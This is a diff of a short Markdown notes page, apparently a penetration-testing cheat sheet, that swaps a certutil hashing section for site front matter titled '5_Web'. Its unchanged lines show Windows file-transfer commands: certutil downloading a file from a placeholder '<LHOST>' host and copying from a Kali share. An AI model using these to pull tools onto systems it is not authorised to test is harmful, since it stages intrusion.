@@ -1,10 +1,9 @@
-# ハッシュ値の取得
-
-## certutil
-```bash
-certutil -hashfile ファイル名 sha1
-```
-
+---
+title: 5_Web
+parent: Windows
+grand_parent: General
+nav_order: 5
+---
 # Web
 
 ```powershell
@@ -29,3 +28,4 @@ certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ```powershell
 copy \\kali\share\file .
 ```
+
